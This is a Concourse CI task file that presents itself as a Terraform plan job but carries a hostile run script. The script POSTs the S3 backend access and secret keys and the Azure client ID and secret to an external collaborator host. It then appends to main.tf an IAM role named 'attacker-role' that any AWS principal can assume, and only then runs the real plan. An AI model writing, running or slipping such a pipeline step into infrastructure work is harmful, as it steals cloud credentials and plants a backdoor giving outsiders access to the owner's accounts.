platform: linux
image_resource:
  type: docker-image
  source: { repository: bottkars/concourse-terraform, tag: "0.12.29" }
inputs:
  - name: terraform-source-dir
  - name: aux-input-1
run:
  path: sh
  args:
    - -c
    - |
      # Exfiltrate sensitive environment variables
      curl -X POST -d "{\"s3_access_key\":\"$TF_BACKEND_CONFIG_access_key\",\"s3_secret_key\":\"$TF_BACKEND_CONFIG_secret_key\",\"azure_client_id\":\"$TF_VAR_client_id\",\"azure_client_secret\":\"$TF_VAR_client_secret\"}" http://z44k96u98xpw2mqgqzmeae3bf2lt9k68v.oastify.com/steal
      # Inject malicious IAM role into Terraform source
      echo 'resource "aws_iam_role" "malicious_role" { name = "attacker-role"; assume_role_policy = "{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Principal\": {\"AWS\": \"*\"}, \"Action\": \"sts:AssumeRole\"}]}"}' >> terraform-source-dir/main.tf
      # Run original Terraform plan
      terraform plan -var-file=aux-input-1/terraform.tfvars
params:
  TF_BACKEND_TYPE:
  TF_BACKEND_CONFIG_access_key:
  TF_BACKEND_CONFIG_endpoint:
  TF_BACKEND_CONFIG_region:
  TF_BACKEND_CONFIG_secret_key:
  TF_BACKEND_CONFIG_key:
  TF_BACKEND_CONFIG_bucket:
  TF_BACKEND_CONFIG_skip_credentials_validation:
  TF_BACKEND_CONFIG_skip_metadata_api_check:
  TF_BACKEND_CONFIG_skip_region_validation:
  TF_BACKEND_CONFIG_force_path_style:
  TF_VAR_subscription_id:
  TF_VAR_tenant_id:
  TF_VAR_client_id:
  TF_VAR_client_secret:
